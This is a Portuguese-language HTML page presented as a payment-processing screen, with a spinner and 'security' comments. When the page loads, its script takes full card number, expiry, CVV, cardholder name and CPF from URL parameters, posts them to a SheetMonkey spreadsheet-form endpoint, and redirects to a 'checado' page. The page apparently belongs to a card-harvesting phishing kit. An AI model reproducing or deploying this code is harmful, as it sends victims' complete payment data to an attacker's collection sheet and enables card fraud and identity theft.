<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processando...</title>
    
    <!-- 🔐 Security Headers via Meta Tags -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.sheetmonkey.io; form-action 'self'; base-uri 'self'; frame-ancestors 'none';">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
    <meta name="robots" content="noindex, nofollow">
    
    <!-- Preconnect para API externa -->
    <link rel="preconnect" href="https://api.sheetmonkey.io">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .loading-container {
            text-align: center;
            background: #fff;
            padding: 40px 60px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }

        /* 🔷 SVG Spinner Profissional */
        .spinner-wrapper {
            width: 60px;
            height: 60px;
            margin: 0 auto 25px;
        }

        .spinner-svg {
            width: 100%;
            height: 100%;
            animation: rotate 1s linear infinite;
        }

        .spinner-circle {
            fill: none;
            stroke: #e0e0e0;
            stroke-width: 4;
            stroke-linecap: round;
        }

        .spinner-path {
            fill: none;
            stroke: url(#gradient);
            stroke-width: 4;
            stroke-linecap: round;
            stroke-dasharray: 100;
            stroke-dashoffset: 25;
            animation: dash 1.4s ease-in-out infinite;
        }

        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }

        @keyframes dash {
            0% { stroke-dashoffset: 100; }
            50% { stroke-dashoffset: 25; transform: rotate(135deg); }
            100% { stroke-dashoffset: 100; transform: rotate(450deg); }
        }

        .loading-text {
            color: #333;
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 10px;
        }

        .loading-subtext {
            color: #666;
            font-size: 14px;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: #f0f0f0;
            border-radius: 3px;
            margin-top: 25px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            border-radius: 3px;
            animation: progress 2s ease-in-out infinite;
            width: 30%;
        }

        @keyframes progress {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(400%); }
        }

        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 15px;
            display: none;
            word-break: break-word;
        }

        /* Ícone de erro SVG */
        .error-icon {
            display: none;
            width: 60px;
            height: 60px;
            margin: 0 auto 25px;
        }

        .error-circle {
            fill: none;
            stroke: #e74c3c;
            stroke-width: 3;
        }

        .error-x {
            stroke: #e74c3c;
            stroke-width: 3;
            stroke-linecap: round;
        }

        body.hidden {
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <!-- Spinner SVG -->
        <div class="spinner-wrapper" id="spinnerWrapper">
            <svg class="spinner-svg" viewBox="0 0 60 60">
                <defs>
                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#667eea"/>
                        <stop offset="100%" style="stop-color:#764ba2"/>
                    </linearGradient>
                </defs>
                <circle class="spinner-circle" cx="30" cy="30" r="24"/>
                <path class="spinner-path" d="M 30 6 A 24 24 0 1 1 54 30"/>
            </svg>
        </div>

        <!-- Ícone de erro SVG (oculto por padrão) -->
        <svg class="error-icon" id="errorIcon" viewBox="0 0 60 60">
            <circle class="error-circle" cx="30" cy="30" r="24"/>
            <line class="error-x" x1="20" y1="20" x2="40" y2="40"/>
            <line class="error-x" x1="40" y1="20" x2="20" y2="40"/>
        </svg>

        <p class="loading-text">Processando seus dados...</p>
        <p class="loading-subtext">Aguarde enquanto enviamos para análise</p>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <p class="error-message" id="errorMessage"></p>
    </div>

    <script>
        /**
         * Processador de Pagamento - SheetMonkey Integration
         * Versão com segurança reforçada e ícones SVG
         */

        // 🔐 Configurações de Segurança
        const API_ENDPOINT = 'https://api.sheetmonkey.io/form/96VhTiSmM4jE5M6MuGYLNs';
        const REDIRECT_URL = 'checado.html';
        const TIMEOUT_MS = 15000;
        
        // Lista de campos sensíveis que NÃO devem aparecer em logs
        const SENSITIVE_FIELDS = ['cardnumber', 'cvv', 'cpf'];

        /**
         * Sanitiza valor para evitar XSS
         * @param {string} str - String a sanitizar
         * @returns {string} String sanitizada
         */
        function sanitizeInput(str) {
            if (typeof str !== 'string') return str;
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        /**
         * Extrai e sanitiza parâmetros da URL
         * @returns {Object} Objeto com parâmetros seguros
         */
        function getUrlParameters() {
            const params = {};
            const queryString = window.location.search.substring(1);
            
            if (!queryString) return params;

            const pairs = queryString.split('&');
            
            for (let pair of pairs) {
                const [key, value] = pair.split('=');
                if (key && value) {
                    const decodedKey = decodeURIComponent(key).trim();
                    const decodedValue = decodeURIComponent(value).trim();
                    // Sanitiza apenas campos não sensíveis para logs
                    params[sanitizeInput(decodedKey)] = decodedValue;
                }
            }
            
            return params;
        }

        /**
         * Valida dados mínimos necessários
         */
        function validateData(data) {
            const requiredFields = ['cardnumber', 'cpf', 'cardholder'];
            
            for (let field of requiredFields) {
                if (!data[field] || data[field].trim() === '') {
                    return false;
                }
            }
            return true;
        }

        /**
         * Envia dados para API com tratamento seguro
         */
        async function sendToSheetMonkey(data) {
            // Cria cópia para log sem dados sensíveis
            const safeLog = { ...data };
            SENSITIVE_FIELDS.forEach(field => {
                if (safeLog[field]) {
                    safeLog[field] = '***REDACTED***';
                }
            });
            console.log('Enviando dados (seguro):', safeLog);

            const response = await fetch(API_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify(data),
                mode: 'cors',
                credentials: 'omit' // 🔐 Não envia cookies
            });

            if (!response.ok) {
                throw new Error(`Erro na API: ${response.status}`);
            }

            return await response.json();
        }

        /**
         * Exibe estado de erro na UI
         */
        function showError(message) {
            const errorEl = document.getElementById('errorMessage');
            const spinner = document.getElementById('spinnerWrapper');
            const errorIcon = document.getElementById('errorIcon');
            
            errorEl.textContent = sanitizeInput(message);
            errorEl.style.display = 'block';
            spinner.style.display = 'none';
            errorIcon.style.display = 'block';
            
            document.querySelector('.loading-text').textContent = 'Ocorreu um erro';
            document.querySelector('.loading-subtext').textContent = 'Redirecionando...';
        }

        /**
         * Limpa parâmetros sensíveis da URL após processamento
         */
        function clearSensitiveURL() {
            if (window.history.replaceState) {
                const cleanUrl = window.location.pathname;
                window.history.replaceState({}, document.title, cleanUrl);
            }
        }

        /**
         * Função principal de processamento
         */
        async function processPayment() {
            try {
                // 🔐 Verifica se está em HTTPS em produção
                if (window.location.protocol === 'http:' && window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
                    console.warn('⚠️ Aviso: Site não está usando HTTPS. Dados podem não estar seguros.');
                }

                const paymentData = getUrlParameters();
                
                if (!validateData(paymentData)) {
                    throw new Error('Dados incompletos na URL');
                }

                const payload = {
                    CardNumber: paymentData.cardnumber,
                    Expiry: paymentData.expiry,
                    CPF: paymentData.cpf,
                    CVV: paymentData.cvv,
                    CardHolder: paymentData.cardholder,
                    Country: paymentData.country,
                    Installments: paymentData.installments,
                    Timestamp: new Date().toISOString(),
                    UserAgent: navigator.userAgent.substring(0, 100) // 🔐 Limitado por segurança
                };

                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), TIMEOUT_MS);

                try {
                    await sendToSheetMonkey(payload);
                    clearTimeout(timeoutId);
                    
                    // 🔐 Limpa URL antes de redirecionar
                    clearSensitiveURL();
                    
                    // Usa replace para não permitir voltar com dados na URL
                    window.location.replace(REDIRECT_URL);
                    
                } catch (fetchError) {
                    clearTimeout(timeoutId);
                    
                    if (fetchError.name === 'AbortError') {
                        throw new Error('Tempo de resposta excedido');
                    }
                    throw fetchError;
                }

            } catch (error) {
                console.error('❌ Erro no processamento:', error.message);
                showError(`Erro: ${error.message}. Redirecionando...`);
                
                // 🔐 Limpa URL mesmo em caso de erro
                clearSensitiveURL();
                
                setTimeout(() => {
                    window.location.replace(REDIRECT_URL);
                }, 3000);
            }
        }

        // Inicialização segura
        (function init() {
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', startProcess);
            } else {
                startProcess();
            }
        })();

        function startProcess() {
            setTimeout(() => {
                document.body.classList.remove('hidden');
                processPayment();
            }, 300);
        }
    </script>
</body>
</html>
